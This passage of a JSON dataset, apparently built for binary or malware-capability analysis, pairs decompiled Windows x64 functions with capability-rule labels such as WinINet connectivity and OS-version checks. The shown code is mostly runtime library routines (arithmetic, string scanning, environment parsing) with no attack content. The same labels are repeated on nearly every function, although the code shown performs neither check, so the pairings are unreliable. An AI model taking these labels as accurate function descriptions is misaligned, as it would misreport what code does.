        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.1400115ec(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.14001139c(param_1, param_2, param_3, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 457
    },
    "1400119e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400119e0(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.140011744(param_1, param_2, param_3, param_4, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 466
    },
    "140011ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n\nuint fcn.140011bac(int64_t arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong var_fh;\n    int64_t var_17h;\n    ulong var_1fh;\n    int64_t var_27h;\n    ulong var_2fh;\n    ulong var_37h;\n    ulong var_3fh;\n    ulong var_67h;\n    ulong var_6fh;\n    ulong var_77h;\n    ulong var_7fh;\n    int64_t aiStack152 [2];\n    uchar uStack136;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    char cStack112;\n    uint uStack108;\n    char cStack104;\n    uint uStack100;\n    char cStack96;\n    ulong uStack88;\n    int64_t iStack80;\n    uchar auStack72 [7];\n    int64_t var_39h;\n    uchar auStack56 [7];\n    int64_t *var_29h;\n    int64_t var_21h;\n    uchar auStack32 [7];\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    aiStack152[0] = 0;\n    cStack112 = *0x1400401e0 == 0;\n    uStack136 = 0;\n    cStack104 = '\\0';\n    cStack96 = '\\0';\n    if (cStack112) {\n        uStack128 = *0x14003e3b8;\n        uStack124 = *0x14003e3bc;\n        uStack120 = *0x14003e3c0;\n        uStack116 = *0x14003e3c4;\n    }\n    var_fh._1_4_ = arg3;\n    unique0x100001ed = arg4;\n    unique0x100001f5 = arg1;\n    uStack88 = arg2;\n    if (arg1 != 0) {\n        if ((arg3 & 0xfffffffb) == 0) {\n            if ((arg3 == 0) || (arg3 == 0x40)) goto code_r0x000140011c49;\ncode_r0x000140011c55:\n            unique0x00003100 = &var_17h + 1;\n            _auStack56 = &var_27h + 1;\n            unique0x00003100 = aiStack152;\n            unique0x00003100 = &var_fh + 1;\n            _auStack32 = &uStack88;\n            iStack80 = arg1;\n            _auStack72 = arg1;\n            uVar2 = fcn.140011a84(&var_1fh + 1, auStack72, &var_39h + 1, &iStack80);\n            goto code_r0x000140011c9c;\n        }\n        if (arg3 == 0x40) {\ncode_r0x000140011c49:\n            if (arg4 - 2U < 0x7ffffffe) goto code_r0x000140011c55;\n        }\n    }\n    cStack104 = '\\x01';\n    uStack108 = 0x16;\n    fcn.14000bf58(0, 0, 0, 0);\n    uVar2 = 0xffffffff;\ncode_r0x000140011c9c:\n    uVar1 = uStack108;\n    if (cStack112 == '\\x02') {\n        *(aiStack152[0] + 0x3a8) = *(aiStack152[0] + 0x3a8) & 0xfffffffd;\n    }\n    if (cStack104 != '\\0') {\n        iVar3 = fcn.14000bc38(aiStack152);\n        *(iVar3 + 0x20) = uVar1;\n    }\n    if (cStack96 != '\\0') {\n        iVar3 = fcn.14000bc38(aiStack152);\n        *(iVar3 + 0x24) = uStack100;\n    }\n    return uVar2;\n}\n",
        "token_count": 971
    },
    "140012d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140012d40(uint32_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint8_t uStackX8;\n    uint32_t uStackX24;\n    uint64_t uStack576;\n    uint64_t uStack560;\n    uchar auStack532 [468];\n    \n    if ((*arg1 == 0) || (uVar5 = *arg2,  uVar5 == 0)) {\n        return 0;\n    }\n    uVar15 = *arg1 - 1;\n    uVar16 = uVar15;\n    uVar18 = uVar5 - 1;\n    if (uVar18 == 0) {\n        uVar5 = arg2[1];\n        uVar8 = 0;\n        if (uVar5 == 1) {\n            uVar5 = arg1[1];\n            *arg1 = 0;\n            fcn.1400131cc(arg1 + 1, 0x1cc, auStack532, 0);\n            return uVar5;\n        }\n        uVar14 = uVar8;\n        if (uVar15 != 0) {\n            while (uVar15 != 0xffffffff) {\n                iVar9 = uVar16 + 1;\n                uVar15 = uVar16 - 1;\n                uVar16 = uVar15;\n                uVar2 = arg1[iVar9] | uVar8 << 0x20;\n                uVar8 = uVar2 % uVar5;\n                uVar14 = (uVar14 << 0x20) + SUB164(ZEXT816(uVar2) / ZEXT416(uVar5), 0);\n            }\n            *arg1 = 0;\n            fcn.1400131cc(arg1 + 1, 0x1cc, auStack532, 0);\n            arg1[1] = uVar8;\n            arg1[2] = 0;\n            *arg1 = 1;\n            return uVar14;\n        }\n        uVar18 = arg1[1];\n        *arg1 = 0;\n        fcn.1400131cc(arg1 + 1, 0x1cc, auStack532, 0);\n        uVar15 = uVar18 % uVar5;\n        arg1[1] = uVar15;\n        *arg1 = uVar15 != 0;\n        return uVar18 / uVar5;\n    }\n    if (uVar15 < uVar18) {\n        return 0;\n    }\n    iVar9 = uVar15;\n    iVar13 = uVar15 - uVar18;\n    iVar12 = iVar13;\n    if (iVar12 <= iVar9) {\n        puVar6 = arg1 + iVar9 + 1;\n        uVar8 = uVar16;\n        do {\n            iVar11 = uVar8;\n            if (*(arg2 + (iVar12 * -4 - arg1) + puVar6) != *puVar6) {\n                if (arg1[iVar11 + 1] <= arg2[(iVar11 - iVar13) + 1]) goto code_r0x000140012eda;\n                break;\n            }\n            uVar8 = iVar11 - 1;\n            iVar9 = iVar9 + -1;\n            puVar6 = puVar6 + -1;\n        } while (iVar12 <= iVar9);\n    }\n    iVar13 = iVar13 + 1;\ncode_r0x000140012eda:\n    if (iVar13 == 0) {\n        return 0;\n    }\n    uVar8 = 0;\n    uVar18 = arg2[(uVar5 - 1) + 1];\n    uVar14 = uVar18;\n    uStackX24 = arg2[(uVar5 - 2) + 1];\n    iVar11 = 0x1f;\n    if (uVar18 != 0) {\n        for (; uVar18 >> iVar11 == 0; iVar11 = iVar11 + -1) {\n        }\n    }\n    uVar10 = 0;\n    if (uVar18 == 0) {\n        iVar11 = 0x20;\n        uStackX8 = 0;\n    }\n    else {\n        iVar11 = 0x1f - iVar11;\n        uStackX8 = 0x20 - iVar11;\n        if (iVar11 == 0) goto code_r0x000140012f6d;\n    }\n    uVar7 = uStackX24 >> (uStackX8 & 0x1f);\n    uStackX24 = uStackX24 << (iVar11 & 0x1f);\n    uVar14 = uVar7 | uVar18 << (iVar11 & 0x1f);\n    if (2 < uVar5) {\n        uStackX24 = uStackX24 | arg2[(uVar5 - 3) + 1] >> (uStackX8 & 0x1f);\n    }\ncode_r0x000140012f6d:\n    iVar13 = iVar13 + -1;\n    uStack560 = 0;\n    uVar2 = uVar8;\n    if (-1 < iVar13) {\n        uVar18 = iVar13 + uVar5;\n        do {\n            uVar15 = uVar10;\n            if (uVar18 <= uVar16) {\n                uVar15 = arg1[uVar18 + 1];\n            }\n            uVar7 = arg1[(uVar18 - 2) + 1];\n            uVar2 = uVar7;\n            uStack576 = CONCAT44(uVar15, arg1[(uVar18 - 1) + 1]);\n            if (iVar11 != 0) {\n                uStack576 = uVar7 >> (uStackX8 & 0x3f) | uStack576 << (iVar11 & 0x3f);\n                uVar7 = uVar7 << (iVar11 & 0x1f);\n                uVar2 = uVar7;\n                if (2 < uVar18) {\n                    uVar2 = uVar7 | arg1[(uVar18 - 3) + 1] >> (uStackX8 & 0x1f);\n                }\n            }\n            uVar3 = uStack576 / uVar14;\n            uStack576 = uStack576 % uVar14;\n            if (0xffffffff < uVar3) {\n                iVar9 = uVar3 - 0xffffffff;\n                uVar3 = 0xffffffff;\n                uStack576 = uStack576 + iVar9 * uVar14;\n            }\n            if (uStack576 < 0x100000000) {\n                uVar4 = uStackX24 * uVar3;\n                do {\n                    if (uVar4 <= (uStack576 << 0x20 | uVar2)) break;\n                    uVar3 = uVar3 - 1;\n                    uVar4 = uVar4 - uStackX24;\n                    uStack576 = uStack576 + uVar14;\n                } while (uStack576 < 0x100000000);\n            }\n            if (uVar3 != 0) {\n                uVar16 = uVar8;\n                uVar7 = uVar10;\n                puVar6 = arg2;\n                if (uVar5 != 0) {\n                    do {\n                        uVar16 = uVar16 + puVar6[1] * uVar3;\n                        uVar1 = uVar16;\n                        uVar2 = uVar16 >> 0x20;\n                        uVar16 = uVar2 + 1;\n                        if (uVar1 <= arg1[uVar7 + iVar13 + 1]) {\n                            uVar16 = uVar2;\n                        }\n                        uVar17 = uVar7 + 1;\n                        arg1[uVar7 + iVar13 + 1] = arg1[uVar7 + iVar13 + 1] - uVar1;\n                        uVar7 = uVar17;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar17 < uVar5);\n                }\n                if (uVar15 < uVar16) {\n                    uVar16 = uVar8;\n                    uVar15 = uVar10;\n                    puVar6 = arg2;\n                    if (uVar5 != 0) {\n                        do {\n                            uVar7 = uVar15 + 1;\n                            uVar16 = uVar16 + puVar6[1] + arg1[uVar15 + iVar13 + 1];\n                            arg1[uVar15 + iVar13 + 1] = uVar16;\n                            uVar16 = uVar16 >> 0x20;\n                            uVar15 = uVar7;\n                            puVar6 = puVar6 + 1;\n                        } while (uVar7 < uVar5);\n                    }\n                    uVar3 = uVar3 - 1;\n                }\n                uVar16 = uVar18 - 1;\n            }\n            uVar15 = uVar16;\n            uVar18 = uVar18 - 1;\n            uVar2 = (uStack560 << 0x20) + (uVar3 & 0xffffffff);\n            iVar13 = iVar13 + -1;\n            uStack560 = uVar2;\n        } while (-1 < iVar13);\n    }\n    uVar15 = uVar15 + 1;\n    uVar16 = uVar15;\n    uVar8 = uVar16;\n    if (uVar15 < *arg1) {\n        do {\n            uVar5 = uVar8 + 1;\n            arg1[uVar8 + 1] = 0;\n            uVar8 = uVar5;\n        } while (uVar5 < *arg1);\n    }\n    *arg1 = uVar15;\n    while( true ) {\n        if (uVar15 == 0) {\n            return uVar2;\n        }\n        uVar15 = uVar16 - 1;\n        uVar16 = uVar15;\n        if (arg1[uVar16 + 1] != 0) break;\n        *arg1 = uVar15;\n    }\n    return uVar2;\n}\n",
        "token_count": 2348
    },
    "140015a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140015a78(uchar (*arg1) [32], uint64_t arg2)\n\n{\n    uchar *puVar1;\n    uchar (*pauVar2) [32];\n    uint64_t uVar3;\n    uchar auVar4 [16];\n    uchar in_YMM1 [32];\n    uint8_t uVar5;\n    \n    pauVar2 = arg1;\n    if (*0x14003e038 < 5) {\n        if (*0x14003e038 < 1) {\n            if (arg1 != *arg1 + arg2) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg1 + arg2);\n            }\n        }\n        else {\n            uVar3 = arg1 & 0xf;\n            uVar3 = -(uVar3 != 0) & 0x10 - uVar3;\n            if (arg2 < uVar3) {\n                uVar3 = arg2;\n            }\n            if (arg1 != *arg1 + uVar3) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg1 + uVar3);\n            }\n            if (pauVar2 - arg1 != uVar3) {\n                return pauVar2 - arg1;\n            }\n            puVar1 = *pauVar2;\n            while ((pauVar2 != puVar1 + (arg2 - uVar3 & 0xfffffffffffffff0) &&\n                   (uVar5 = -((*pauVar2)[0xf] == '\\0'), \n                   auVar4 = CONCAT115(uVar5, CONCAT114(-((*pauVar2)[0xe] == '\\0'), \n                                                       CONCAT113(-((*pauVar2)[0xd] == '\\0'), \n                                                                 CONCAT112(-((*pauVar2)[0xc] == '\\0'), \n                                                                           CONCAT111(-((*pauVar2)[0xb] == '\\0'), \n                                                                                     CONCAT110(-((*pauVar2)[10] == '\\0')\n                                                                                               , CONCAT19(-((*pauVar2)\n                                                                                                            [9] == '\\0')\n                                                                                                          , CONCAT18(-((\n                                                            *pauVar2)[8] == '\\0'), \n                                                            CONCAT17(-((*pauVar2)[7] == '\\0'), \n                                                                     CONCAT16(-((*pauVar2)[6] == '\\0'), \n                                                                              CONCAT15(-((*pauVar2)[5] == '\\0'), \n                                                                                       CONCAT14(-((*pauVar2)[4] == '\\0')\n                                                                                                , CONCAT13(-((*pauVar2)\n                                                                                                             [3] == '\\0'\n                                                                                                            ), CONCAT12(\n                                                            -((*pauVar2)[2] == '\\0'), \n                                                            CONCAT11(-((*pauVar2)[1] == '\\0'), -((*pauVar2)[0] == '\\0'))\n                                                            )))))))))))))), \n                   (SUB161(auVar4 >> 7, 0) & 1 | (SUB161(auVar4 >> 0xf, 0) & 1) << 1 |\n                    (SUB161(auVar4 >> 0x17, 0) & 1) << 2 | (SUB161(auVar4 >> 0x1f, 0) & 1) << 3 |\n                    (SUB161(auVar4 >> 0x27, 0) & 1) << 4 | (SUB161(auVar4 >> 0x2f, 0) & 1) << 5 |\n                    (SUB161(auVar4 >> 0x37, 0) & 1) << 6 | (SUB161(auVar4 >> 0x3f, 0) & 1) << 7 |\n                    (SUB161(auVar4 >> 0x47, 0) & 1) << 8 | (SUB161(auVar4 >> 0x4f, 0) & 1) << 9 |\n                    (SUB161(auVar4 >> 0x57, 0) & 1) << 10 | (SUB161(auVar4 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB161(auVar4 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar4 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB161(auVar4 >> 0x77, 0) & 1) << 0xe | (uVar5 >> 7) << 0xf) == 0))) {\n                pauVar2 = *pauVar2 + 0x10;\n            }\n            for (; (pauVar2 != *arg1 + arg2 && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n            }\n        }\n    }\n    else {\n        uVar3 = arg1 & 0x1f;\n        uVar3 = -(uVar3 != 0) & 0x20 - uVar3;\n        if (arg2 < uVar3) {\n            uVar3 = arg2;\n        }\n        if (arg1 != *arg1 + uVar3) {\n            do {\n                if ((*pauVar2)[0] == '\\0') break;\n                pauVar2 = *pauVar2 + 1;\n            } while (pauVar2 != *arg1 + uVar3);\n        }\n        if (pauVar2 - arg1 != uVar3) {\n            return pauVar2 - arg1;\n        }\n        puVar1 = *pauVar2;\n        for (; pauVar2 != puVar1 + (arg2 - uVar3 & 0xffffffffffffffe0); pauVar2 = pauVar2[1]) {\n            auVar4 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            in_YMM1 = vpcmpeqb_avx2(ZEXT1632(auVar4), *pauVar2);\n            vzeroupper_avx();\n            if ((SUB321(in_YMM1 >> 7, 0) & 1 | (SUB321(in_YMM1 >> 0xf, 0) & 1) << 1 |\n                 (SUB321(in_YMM1 >> 0x17, 0) & 1) << 2 | (SUB321(in_YMM1 >> 0x1f, 0) & 1) << 3 |\n                 (SUB321(in_YMM1 >> 0x27, 0) & 1) << 4 | (SUB321(in_YMM1 >> 0x2f, 0) & 1) << 5 |\n                 (SUB321(in_YMM1 >> 0x37, 0) & 1) << 6 | (SUB321(in_YMM1 >> 0x3f, 0) & 1) << 7 |\n                 (SUB321(in_YMM1 >> 0x47, 0) & 1) << 8 | (SUB321(in_YMM1 >> 0x4f, 0) & 1) << 9 |\n                 (SUB321(in_YMM1 >> 0x57, 0) & 1) << 10 | (SUB321(in_YMM1 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB321(in_YMM1 >> 0x67, 0) & 1) << 0xc | (SUB321(in_YMM1 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB321(in_YMM1 >> 0x77, 0) & 1) << 0xe | SUB321(in_YMM1 >> 0x7f, 0) << 0xf |\n                 (SUB321(in_YMM1 >> 0x87, 0) & 1) << 0x10 | (SUB321(in_YMM1 >> 0x8f, 0) & 1) << 0x11 |\n                 (SUB321(in_YMM1 >> 0x97, 0) & 1) << 0x12 | (SUB321(in_YMM1 >> 0x9f, 0) & 1) << 0x13 |\n                 (SUB321(in_YMM1 >> 0xa7, 0) & 1) << 0x14 | (SUB321(in_YMM1 >> 0xaf, 0) & 1) << 0x15 |\n                 (SUB321(in_YMM1 >> 0xb7, 0) & 1) << 0x16 | SUB321(in_YMM1 >> 0xbf, 0) << 0x17 |\n                 (SUB321(in_YMM1 >> 199, 0) & 1) << 0x18 | (SUB321(in_YMM1 >> 0xcf, 0) & 1) << 0x19 |\n                 (SUB321(in_YMM1 >> 0xd7, 0) & 1) << 0x1a | (SUB321(in_YMM1 >> 0xdf, 0) & 1) << 0x1b |\n                 (SUB321(in_YMM1 >> 0xe7, 0) & 1) << 0x1c | (SUB321(in_YMM1 >> 0xef, 0) & 1) << 0x1d |\n                 (SUB321(in_YMM1 >> 0xf7, 0) & 1) << 0x1e | SUB321(in_YMM1 >> 0xff, 0) << 0x1f) != 0) break;\n        }\n        for (; (pauVar2 != *arg1 + arg2 && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n        }\n    }\n    return pauVar2 - arg1;\n}\n",
        "token_count": 2276
    },
    "14001645": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140016450(char *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t *arg1_00;\n    int64_t *piVar4;\n    char cVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    \n    cVar5 = *arg1;\n    iVar6 = 0;\n    pcVar8 = arg1;\n    while (cVar5 != '\\0') {\n        iVar7 = iVar6 + 1;\n        if (cVar5 == '=') {\n            iVar7 = iVar6;\n        }\n        iVar6 = -1;\n        do {\n            iVar3 = iVar6;\n            iVar6 = iVar3 + 1;\n        } while (pcVar8[iVar6] != '\\0');\n        pcVar8 = pcVar8 + iVar3 + 2;\n        iVar6 = iVar7;\n        cVar5 = *pcVar8;\n    }\n    arg1_00 = fcn.140019ad4(iVar6 + 1, 8);\n    piVar4 = arg1_00;\n    if (arg1_00 == NULL) {\ncode_r0x0001400164b3:\n        fcn.140019b4c(0);\n        arg1_00 = NULL;\n    }\n    else {\n        for (; *arg1 != '\\0'; arg1 = arg1 + iVar7) {\n            iVar6 = -1;\n            do {\n                iVar7 = iVar6;\n                iVar6 = iVar7 + 1;\n            } while (arg1[iVar6] != '\\0');\n            iVar7 = iVar7 + 2;\n            if (*arg1 != '=') {\n                iVar6 = fcn.140019ad4(iVar7, 1);\n                if (iVar6 == 0) {\n                    fcn.140016560(arg1_00);\n                    fcn.140019b4c(0);\n                    goto code_r0x0001400164b3;\n                }\n                iVar2 = fcn.140018aa0(iVar6, iVar7, arg1);\n                if (iVar2 != 0) {\n                    fcn.14000c078(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    piVar4 = (*pcVar1)();\n                    return piVar4;\n                }\n                *piVar4 = iVar6;\n                piVar4 = piVar4 + 1;\n                fcn.140019b4c(0);\n            }\n        }\n        fcn.140019b4c(0);\n    }\n    return arg1_00;\n}\n",
        "token_count": 591
    },
    "14001685": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140016858(int32_t **arg1)\n\n{\n    ulong arg1_00;\n    \n    if (*0x1400401a8 != '\\0') {\n        return;\n    }\n    *0x140040198 = 1;\n    if (**arg1 == 0) {\n        if (*0x1400401a0 != *0x14003e020) {\n            (**0x14002b348)(0, 0, 0);\n        }\n        arg1_00 = 0x1400401f0;\n    }\n    else {\n        if (**arg1 != 1) goto code_r0x0001400168d2;\n        arg1_00 = 0x140040208;\n    }\n    fcn.140018848(arg1_00);\ncode_r0x0001400168d2:\n    if (**arg1 == 0) {\n        fcn.140016794(0x14002b400, 0x14002b420);\n    }\n    fcn.140016794(0x14002b428, 0x14002b430);\n    if (*arg1[1] == 0) {\n        *0x1400401a8 = '\\x01';\n        *arg1[2] = 1;\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "140016ad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140016949)\n// WARNING: Removing unreachable block (ram,0x000140016956)\n// WARNING: Removing unreachable block (ram,0x000140016960)\n// WARNING: Removing unreachable block (ram,0x00014001696f)\n// WARNING: Removing unreachable block (ram,0x00014001697a)\n// WARNING: Removing unreachable block (ram,0x000140016983)\n// WARNING: Removing unreachable block (ram,0x00014001698c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140016ad8(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    ulong var_20h;\n    uint *var_bp_18h;\n    int32_t *var_bp_10h;\n    ulong *var_8h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = 0xfffffffffffffffe;\n    var_28h._0_1_ = 0;\n    var_bp_18h = auStackX16;\n    var_bp_10h = aiStackX24;\n    var_8h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.140016820(var_30h, &var_2ch + 4, &var_bp_18h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.1400169ec(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "1400182c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400182c4(int64_t arg1, int64_t *arg2)\n\n{\n    uint16_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    int64_t arg1_00;\n    uint64_t uVar8;\n    \n    if (*(arg2 + 2) == 0) {\n        arg1_00 = arg1;\n        if (arg2[1] == 2) {\n            arg1_00 = *arg2;\n            cVar4 = fcn.140018448(arg1_00, 2);\n            if (cVar4 != '\\0') goto code_r0x000140018333;\n        }\n        if (arg2[1] == 3) {\n            iVar2 = *arg2;\n            uVar8 = 0;\n            do {\n                uVar1 = *(iVar2 + uVar8 * 2);\n                iVar6 = fcn.140012270(arg1_00);\n                arg1_00 = 0xff;\n                if (0xff < uVar1) {\n                    return 0;\n                }\n                if ((*(iVar6 + uVar1 * 2) & 4) == 0) {\n                    return 0;\n                }\n                uVar8 = uVar8 + 1;\n            } while (uVar8 < 3);\ncode_r0x000140018333:\n            iVar5 = fcn.1400205a0(arg1 + 0x80, 0x40, *arg2, arg2[1]);\n            if (((iVar5 == 0) && (iVar5 = fcn.1400233bc(arg1 + 0x120, 0x55, 0x14002c704, 1),  iVar5 == 0)) &&\n               (iVar5 = fcn.1400233bc(arg1 + 0x120, 0x55, *arg2, arg2[1]),  iVar5 == 0)) {\n                return 1;\n            }\n            fcn.14000c078(0, 0, 0, 0, 0);\n            pcVar3 = swi(3);\n            uVar7 = (*pcVar3)();\n            return uVar7;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 525
    },
    "140018a2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140018a28(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x140030df0;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x14002b348)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x140030ef0);\n    if (piVar3 == 0x140030ef0) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x140030df0) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x14002b348)(0);\n                }\n                bVar4 = piVar3 != 0x140030df8;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 271
    },
    "14001928": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
